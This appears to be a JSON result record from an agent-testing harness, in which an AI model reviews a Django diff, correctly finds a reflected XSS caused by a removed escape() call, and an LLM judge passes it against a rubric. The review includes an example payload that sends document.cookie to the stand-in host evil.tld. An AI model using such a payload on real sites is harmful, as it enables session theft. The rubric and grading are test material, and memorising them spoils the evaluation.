@@ -1,0 +1,71 @@
+{
+  "caseId": "multifile-xss",
+  "rep": 2,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-multifile-xss.patch"
+  ],
+  "output": "I've reviewed the patch. There's a clear, high-severity security regression.\n\n## Finding: Reflected XSS via unescaped user input (OWASP A03: Injection / Cross-Site Scripting)\n\n**Severity:** High\n**Files:** `src/render.py`, `src/views.py`\n\n### What the diff does\n\nThe change refactors HTML rendering into a helper, but **drops the output encoding** in the process.\n\n**Before** (`views.py`) — safe. User input was HTML-escaped before interpolation:\n```python\nreturn HttpResponse(\"<div class='comment'>\" + escape(comment) + \"</div>\")\n```\n\n**After** — the new helper interpolates raw, unescaped input directly into markup:\n```python\n# render.py\ndef comment_html(text):\n    return f\"<div class='comment'>{text}</div>\"   # no escaping\n\n# views.py\ncomment = request.GET.get(\"comment\", \"\")\nreturn HttpResponse(comment_html(comment))         # escape() removed\n```\n\nThe `escape()` call was removed and nothing replaced it. `comment_html` performs no encoding, so attacker-controlled data flows from `request.GET` straight into the HTTP response body.\n\n### Exploit\n\nA request such as:\n```\nGET /show_comment?comment=<script>document.location='https://evil.tld/c?'+document.cookie</script>\n```\nrenders as:\n```html\n<div class='comment'><script>document.location='https://evil.tld/c?'+document.cookie</script></div>\n```\nThe script executes in the victim's browser context — enabling session/cookie theft, credential phishing, CSRF-token exfiltration, and full account takeover. Note the `class='...'` uses single quotes, so `'`-based attribute breakout is also possible even without `<script>`.\n\n### Why it's easy to miss\n\nThe vulnerability is split across two files: `render.py` looks like a harmless string helper in isolation, and `views.py` looks cleaner because it now calls a named function. The removal of `escape()` is only visible when both hunks are read together. Note `escape` is still imported in `render.py` but never used — a red flag.\n\n### Remediation\n\nPrefer Django's autoescaping template layer, or escape at the point of interpolation. Minimal fix:\n\n```python\nfrom django.utils.html import escape, format_html\n\ndef comment_html(text):\n    # format_html escapes each argument before interpolation\n    return format_html(\"<div class='comment'>{}</div>\", text)\n```\n\n`format_html` returns a `SafeString` with all args escaped. Avoid raw f-strings for HTML entirely. Better still: render through a Django template (`render()`), which autoescapes by default, rather than hand-building `HttpResponse` markup.\n\n### Hardening recommendations\n\n- Add a **Content-Security-Policy** header (e.g. `default-src 'self'; script-src 'self'`) as defense-in-depth against XSS.\n- Add a regression **unit test** asserting `<script>` input is escaped in the response.\n- Add a **SAST rule** (Semgrep/CodeQL) flagging f-string/`+`-concatenated HTML built from `request.GET`/`request.POST` — this class of bug should fail CI.\n- Grep the codebase for other raw f-string/concatenated HTML helpers that may share this pattern.\n\n**Recommendation: block this change from merging until the escaping is restored.**",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-18T23:51:21.029Z",
+  "durationMs": 30565,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified a reflected XSS vulnerability spanning both files, noting that views.py removed the escape() call on user-controlled request.GET input and that render.py's comment_html f-string interpolates it directly into HTML without escaping, providing a concrete exploit and correct remediation.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified a reflected XSS vulnerability spanning both files, noting that views.py removed the escape() call on user-controlled request.GET input and that render.py's comment_html f-string interpolates it directly into HTML without escaping, providing a concrete exploit and correct remediation."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the reflected XSS vulnerability spanning both files—noting that `escape(comment)` was removed in views.py and that the new `comment_html` in render.py interpolates the raw argument via an f-string with no escaping—provided a concrete exploit payload, and gave a correct remediation, fully matching the rubric's requirements.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the reflected XSS vulnerability spanning both files—noting that `escape(comment)` was removed in views.py and that the new `comment_html` in render.py interpolates the raw argument via an f-string with no escaping—provided a concrete exploit payload, and gave a correct remediation, fully matching the rubric's requirements."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe diff introduces a reflected XSS vulnerability that spans two files. In `views.py` the previous `escape(comment)` is removed and the user-controlled `comment` (from request.GET) is now passed through `comment_html(...)`; in `render.py` the new `comment_html` interpolates its argument directly into HTML via an f-string with no escaping. Together, attacker-controlled `comment` is reflected as raw HTML. PASS only if the review identifies a real XSS (cross-site scripting) vulnerability arising from unescaped user input rendered into HTML; FAIL if it misses it (for example by reviewing only one of the two files), concludes the code is safe, or only comments on style.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\nI've reviewed the patch. There's a clear, high-severity security regression.\n\n## Finding: Reflected XSS via unescaped user input (OWASP A03: Injection / Cross-Site Scripting)\n\n**Severity:** High\n**Files:** `src/render.py`, `src/views.py`\n\n### What the diff does\n\nThe change refactors HTML rendering into a helper, but **drops the output encoding** in the process.\n\n**Before** (`views.py`) — safe. User input was HTML-escaped before interpolation:\n```python\nreturn HttpResponse(\"<div class='comment'>\" + escape(comment) + \"</div>\")\n```\n\n**After** — the new helper interpolates raw, unescaped input directly into markup:\n```python\n# render.py\ndef comment_html(text):\n    return f\"<div class='comment'>{text}</div>\"   # no escaping\n\n# views.py\ncomment = request.GET.get(\"comment\", \"\")\nreturn HttpResponse(comment_html(comment))         # escape() removed\n```\n\nThe `escape()` call was removed and nothing replaced it. `comment_html` performs no encoding, so attacker-controlled data flows from `request.GET` straight into the HTTP response body.\n\n### Exploit\n\nA request such as:\n```\nGET /show_comment?comment=<script>document.location='https://evil.tld/c?'+document.cookie</script>\n```\nrenders as:\n```html\n<div class='comment'><script>document.location='https://evil.tld/c?'+document.cookie</script></div>\n```\nThe script executes in the victim's browser context — enabling session/cookie theft, credential phishing, CSRF-token exfiltration, and full account takeover. Note the `class='...'` uses single quotes, so `'`-based attribute breakout is also possible even without `<script>`.\n\n### Why it's easy to miss\n\nThe vulnerability is split across two files: `render.py` looks like a harmless string helper in isolation, and `views.py` looks cleaner because it now calls a named function. The removal of `escape()` is only visible when both hunks are read together. Note `escape` is still imported in `render.py` but never used — a red flag.\n\n### Remediation\n\nPrefer Django's autoescaping template layer, or escape at the point of interpolation. Minimal fix:\n\n```python\nfrom django.utils.html import escape, format_html\n\ndef comment_html(text):\n    # format_html escapes each argument before interpolation\n    return format_html(\"<div class='comment'>{}</div>\", text)\n```\n\n`format_html` returns a `SafeString` with all args escaped. Avoid raw f-strings for HTML entirely. Better still: render through a Django template (`render()`), which autoescapes by default, rather than hand-building `HttpResponse` markup.\n\n### Hardening recommendations\n\n- Add a **Content-Security-Policy** header (e.g. `default-src 'self'; script-src 'self'`) as defense-in-depth against XSS.\n- Add a regression **unit test** asserting `<script>` input is escaped in the response.\n- Add a **SAST rule** (Semgrep/CodeQL) flagging f-string/`+`-concatenated HTML built from `request.GET`/`request.POST` — this class of bug should fail CI.\n- Grep the codebase for other raw f-string/concatenated HTML helpers that may share this pattern.\n\n**Recommendation: block this change from merging until the escaping is restored.**\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "usage": {
+    "input_tokens": 6,
+    "output_tokens": 1395,
+    "model": "opus"
+  },
+  "transcript": {
+    "subtype": "success",
+    "num_turns": 3,
+    "total_cost_usd": 0.11305300000000001,
+    "modelUsage": {
+      "claude-haiku-4-5-20251001": {
+        "inputTokens": 544,
+        "outputTokens": 13,
+        "cacheReadInputTokens": 0,
+        "cacheCreationInputTokens": 0,
+        "webSearchRequests": 0,
+        "costUSD": 0.000609,
+        "contextWindow": 200000,
+        "maxOutputTokens": 32000
+      },
+      "claude-opus-4-8": {
+        "inputTokens": 6,
+        "outputTokens": 1395,
+        "cacheReadInputTokens": 64158,
+        "cacheCreationInputTokens": 4546,
+        "webSearchRequests": 0,
+        "costUSD": 0.112444,
+        "contextWindow": 1000000,
+        "maxOutputTokens": 64000
+      }
+    },
+    "_note": "SDK message stream removed for privacy; summary retained"
+  }
+}
